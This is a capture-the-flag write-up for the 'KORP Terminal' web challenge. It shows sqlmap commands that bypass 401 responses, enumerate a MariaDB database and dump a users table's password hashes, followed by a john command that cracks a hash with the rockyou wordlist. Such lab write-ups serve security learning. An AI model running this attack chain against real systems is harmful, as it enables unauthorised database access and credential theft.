# KORP Terminal

So here is the page we are greeted with:

<figure><img src="../../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Nothing much happening here, nothing in the source code, so i go on and capture a request

<figure><img src="../../../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

So i tried some basic sql bypasses but nothing seems to be a low hanging fruit but i was able to make an interesting error pop:

<figure><img src="../../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

so we got some mariaDB behing this, but since i wan't to be quick i copy all the content in the request tab and put it in a txt file:

```
sqlmap -r req.txt
```

<figure><img src="../../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

We get blocked because of the response code but we can continue by ignoring this:

```
sqlmap -r req.txt --ignore-code 401 --dbs
```

<figure><img src="../../../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

```
sqlmap -r req.txt --ignore-code 401 --tables korp_terminal
```

<figure><img src="../../../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

```
sqlmap -r req.txt --ignore-code 401 --tables users --columns
```

<figure><img src="../../../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

```
sqlmap -r req.txt --ignore-code 401 -T users -C password --dump
```

<figure><img src="../../../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Now that we have our hash we can try to bruteforce ir:

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt.gz
```

and we find the password (we could guess that smh...)
